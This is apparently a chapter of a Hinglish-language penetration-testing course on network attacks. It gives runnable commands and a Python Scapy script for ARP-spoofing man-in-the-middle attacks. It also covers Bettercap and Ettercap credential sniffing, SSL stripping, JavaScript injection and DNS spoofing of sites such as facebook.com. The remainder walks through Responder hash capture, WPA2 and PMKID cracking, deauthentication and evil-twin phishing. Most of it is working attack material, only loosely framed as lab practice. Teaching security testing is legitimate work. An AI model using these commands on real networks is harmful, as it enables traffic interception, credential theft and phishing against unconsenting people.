# 🌐 Phase 3 — Network Attacks: MITM, Sniffing & WiFi Hacking

> Network level pe attack karna = data intercept, credentials steal, traffic manipulate.
> Yeh sab kuch tere local network lab mein practice karega.

---

## 🕸️ Man-in-the-Middle (MITM) Attacks

### How MITM Works

```
NORMAL:
  Victim ←──────────────→ Router ←──→ Internet
  
MITM:
  Victim ←──→ ATTACKER ←──→ Router ←──→ Internet
              (You sit in the middle)
              (See ALL traffic!)
```

### ARP Spoofing — The Classic MITM

```bash
# ═══════════════════════════════════════════════
# Step 1: Enable IP forwarding (route traffic through you)
# ═══════════════════════════════════════════════
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# ═══════════════════════════════════════════════
# Step 2: ARP Spoof with arpspoof
# ═══════════════════════════════════════════════
sudo apt install -y dsniff

# Tell VICTIM that YOU are the ROUTER
sudo arpspoof -i eth0 -t VICTIM_IP ROUTER_IP

# Tell ROUTER that YOU are the VICTIM (new terminal)
sudo arpspoof -i eth0 -t ROUTER_IP VICTIM_IP

# Now ALL traffic between victim and router goes through YOU!

# ═══════════════════════════════════════════════
# Step 3: Capture traffic with Wireshark or tcpdump
# ═══════════════════════════════════════════════
sudo tcpdump -i eth0 -w mitm_capture.pcap
# OR open Wireshark GUI

# ═══════════════════════════════════════════════
# PYTHON ARP SPOOFER (Custom script)
# ═══════════════════════════════════════════════
```

```python
#!/usr/bin/env python3
"""ARP Spoofer — MITM Attack (Lab Only!)"""
from scapy.all import *
import time
import sys

def get_mac(ip):
    """Get MAC address of IP via ARP"""
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    if ans:
        return ans[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip):
    """Send fake ARP reply"""
    target_mac = get_mac(target_ip)
    if target_mac:
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=0)

def restore(target_ip, source_ip):
    """Restore real ARP entries"""
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=4, verbose=0)

# Usage
victim_ip = "192.168.1.100"
gateway_ip = "192.168.1.1"
sent = 0

try:
    while True:
        spoof(victim_ip, gateway_ip)  # Tell victim WE are gateway
        spoof(gateway_ip, victim_ip)  # Tell gateway WE are victim
        sent += 2
        print(f"\r[*] Packets sent: {sent}", end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[*] Restoring ARP tables...")
    restore(victim_ip, gateway_ip)
    restore(gateway_ip, victim_ip)
    print("[+] ARP tables restored")
```

### Bettercap — Modern MITM Framework

```bash
# ═══════════════════════════════════════════════
# Bettercap = Swiss Army Knife for Network Attacks
# ═══════════════════════════════════════════════
sudo apt install -y bettercap

# Start Bettercap
sudo bettercap -iface eth0

# Inside Bettercap:
» net.probe on                     # Discover devices
» net.show                         # Show discovered devices
» set arp.spoof.targets VICTIM_IP  # Set target
» arp.spoof on                     # Start ARP spoofing
» net.sniff on                     # Start sniffing traffic

# Capture credentials (HTTP)
» set net.sniff.regexp .*password.*
» net.sniff on

# DNS Spoofing (redirect websites!)
» set dns.spoof.domains google.com,facebook.com
» set dns.spoof.address YOUR_IP
» dns.spoof on

# HTTPS Downgrade (SSLstrip)
» set http.proxy.sslstrip true
» http.proxy on
» arp.spoof on

# Inject JavaScript into victim's browser!
» set http.proxy.injectjs alert('Hacked!')
» http.proxy on

# Caplets (automated scripts)
» caplets.show
» caplets.update
» include http-ui                   # Web UI
```

### Ettercap — Another MITM Tool

```bash
# GUI mode
sudo ettercap -G

# Text mode MITM
sudo ettercap -T -q -i eth0 -M arp:remote /VICTIM_IP// /GATEWAY_IP//

# With DNS spoofing
# Edit /etc/ettercap/etter.dns first:
# target.com A YOUR_IP
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /VICTIM_IP// /GATEWAY_IP//
```

---

## 📡 Packet Sniffing & Analysis

### Wireshark — GUI Packet Analyzer

```
ESSENTIAL WIRESHARK FILTERS:

# Protocol filters
http                    # HTTP traffic only
dns                     # DNS traffic
tcp                     # TCP only
udp                     # UDP only
arp                     # ARP packets
icmp                    # Ping packets
ftp                     # FTP traffic
ssh                     # SSH traffic
tls                     # HTTPS/TLS traffic

# IP filters
ip.addr == 192.168.1.100           # Traffic to/from IP
ip.src == 192.168.1.100            # Traffic FROM IP
ip.dst == 192.168.1.100            # Traffic TO IP

# Port filters
tcp.port == 80                      # HTTP
tcp.port == 443                     # HTTPS
tcp.port == 21                      # FTP
tcp.dstport == 3306                 # MySQL

# Credential hunting
http.request.method == "POST"       # POST requests (logins!)
ftp.request.command == "PASS"       # FTP passwords
http contains "password"            # Password in HTTP
http contains "login"               # Login traffic

# Find files
http.request.uri contains ".pdf"
http.request.uri contains ".zip"

# Follow TCP stream: Right-click packet → Follow → TCP Stream
# This shows the full conversation — including credentials!
```

### tcpdump — Command Line Sniffing

```bash
# Basic capture
sudo tcpdump -i eth0

# Capture to file
sudo tcpdump -i eth0 -w capture.pcap

# Filter by host
sudo tcpdump -i eth0 host 192.168.1.100

# Filter by port
sudo tcpdump -i eth0 port 80

# Capture credentials (HTTP POST)
sudo tcpdump -i eth0 -A -s0 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'

# Capture DNS queries
sudo tcpdump -i eth0 port 53 -vv

# Look for passwords in traffic
sudo tcpdump -i eth0 -A | grep -i "pass\|user\|login"
```

### Responder — Capture Windows Credentials

```bash
# ═══════════════════════════════════════════════
# Responder captures NTLMv2 hashes on the network!
# When Windows machines look for network resources,
# Responder answers and captures credentials.
# ═══════════════════════════════════════════════

sudo apt install -y responder

# Start Responder
sudo responder -I eth0 -dwPv

# Captured hashes are in /usr/share/responder/logs/
# Crack with hashcat:
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 📡 WiFi Hacking (Wireless Attacks)

> [!WARNING]
> USB WiFi adapter chahiye jo monitor mode support kare.
> Recommended: **Alfa AWUS036ACH** ya **AWUS036ACHM** (Amazon pe milta hai)
> UTM mein USB passthrough se connect karo.

### Monitor Mode Setup

```bash
# Check wireless interfaces
iwconfig
sudo airmon-ng

# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Verify
iwconfig wlan0mon
```

### WPA/WPA2 Attack (Handshake Capture + Crack)

```bash
# ═══════════════════════════════════════════════
# Step 1: Scan for networks
# ═══════════════════════════════════════════════
sudo airodump-ng wlan0mon
# Note: BSSID, Channel, and ESSID of YOUR target network

# ═══════════════════════════════════════════════
# Step 2: Target specific network & capture handshake
# ═══════════════════════════════════════════════
sudo airodump-ng wlan0mon -c CHANNEL --bssid TARGET_BSSID -w capture

# ═══════════════════════════════════════════════
# Step 3: Force handshake (deauth attack)
# ═══════════════════════════════════════════════
# In NEW terminal:
sudo aireplay-ng --deauth 20 -a TARGET_BSSID wlan0mon
# This disconnects clients → they reconnect → we capture handshake!

# Wait for "WPA handshake: XX:XX:XX" message in airodump

# ═══════════════════════════════════════════════
# Step 4: Crack the handshake
# ═══════════════════════════════════════════════

# With aircrack-ng (CPU)
sudo aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt

# With hashcat (GPU — MUCH FASTER!)
# Convert first:
hcxpcapngtool capture-01.cap -o hash.hc22000
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# With John the Ripper
aircrack-ng capture-01.cap -J hash_john
john hash_john.hccap --wordlist=/usr/share/wordlists/rockyou.txt
```

### PMKID Attack (No Handshake Needed!)

```bash
# ═══════════════════════════════════════════════
# PMKID attack = Capture PMKID from AP directly
# No need to deauth any client!
# ═══════════════════════════════════════════════

# Using hcxdumptool
sudo apt install -y hcxdumptool hcxtools
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool pmkid.pcapng -o pmkid.hc22000

# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

### Evil Twin Attack (Fake AP)

```bash
# ═══════════════════════════════════════════════
# Create a fake WiFi network that looks like the real one
# Victims connect to YOUR AP → you see all traffic!
# ═══════════════════════════════════════════════

# Using hostapd-wpe (Wireless Pwnage Edition)
sudo apt install -y hostapd-wpe

# Or use Wifiphisher (automated!)
sudo apt install -y wifiphisher
sudo wifiphisher

# Wifiphisher will:
# 1. Create fake AP with same name
# 2. Deauth clients from real AP
# 3. Clients connect to your fake AP
# 4. Show fake login page
# 5. Capture credentials!

# Fluxion (another evil twin tool)
git clone https://github.com/FluxionNetwork/fluxion.git
cd fluxion
sudo ./fluxion.sh
```

### Automated WiFi Tools

```bash
# Wifite — Automated WiFi auditing
sudo wifite --kill                   # auto everything

# Airgeddon — Menu-based WiFi attacks
git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git
cd airgeddon
sudo bash airgeddon.sh
# Beautiful menu with ALL wireless attacks
```

---

## 🔐 DNS Attacks

### DNS Spoofing

```bash
# ═══════════════════════════════════════════════
# Redirect victim's DNS requests to YOUR server
# victim types google.com → goes to YOUR machine!
# ═══════════════════════════════════════════════

# Method 1: Bettercap
sudo bettercap -iface eth0
» set arp.spoof.targets VICTIM_IP
» arp.spoof on
» set dns.spoof.domains facebook.com,instagram.com
» set dns.spoof.address YOUR_IP     # your fake web server
» dns.spoof on

# Method 2: Ettercap
# Edit /etc/ettercap/etter.dns:
# facebook.com A YOUR_IP
# *.facebook.com A YOUR_IP
sudo ettercap -T -q -i eth0 -M arp:remote -P dns_spoof /VICTIM// /GATEWAY//

# Method 3: dnschef (standalone DNS proxy)
sudo pip3 install dnschef
sudo dnschef --fakedomains facebook.com --fakeip YOUR_IP -i YOUR_IP
```

---

## 🎥 Phase 3 Videos

```
1. "Man-in-the-Middle Attack" — David Bombal (Bettercap)
   https://www.youtube.com/watch?v=TuET0kpHoyM

2. "WiFi Hacking Full Course" — freeCodeCamp (3+ hours)
   https://www.youtube.com/watch?v=hQfsOrv12nE

3. "ARP Spoofing" — NetworkChuck
   https://www.youtube.com/watch?v=A7nih6SANYs

4. "Wireshark Full Course" — Chris Greer (7 hours)
   https://www.youtube.com/watch?v=lb1Dw0elw0Q

5. "Evil Twin WiFi Attack" — David Bombal
   https://www.youtube.com/watch?v=Z5FxzMWEGpU

6. "Bettercap Full Tutorial" — HackerSploit
   https://www.youtube.com/watch?v=VUZL5zsEBHQ

7. "Responder + NTLMv2 Cracking" — TCM Security
   https://www.youtube.com/watch?v=iyYqgIGSWGI
```

---

## ✅ Phase 3 Checklist

```
MITM
[ ] Can perform ARP spoofing (manual + tools)
[ ] Can use Bettercap for full MITM
[ ] Can intercept HTTP traffic and find credentials
[ ] Understand SSL stripping concept

SNIFFING
[ ] Can use Wireshark with filters
[ ] Can use tcpdump for CLI capture
[ ] Can use Responder on Windows networks
[ ] Can analyze captured packets

WIFI
[ ] Can set adapter to monitor mode
[ ] Can capture WPA2 handshake
[ ] Can crack handshake with wordlist
[ ] Know PMKID attack (no handshake needed)
[ ] Understand Evil Twin concept
[ ] Can use Wifite/Airgeddon for automation

DNS
[ ] Can perform DNS spoofing
[ ] Can redirect traffic to fake server
```

---

> **Phase 3 done? → [Phase 4 — Web Exploitation](./Phase4_Web_Exploitation.md)** 🕸️
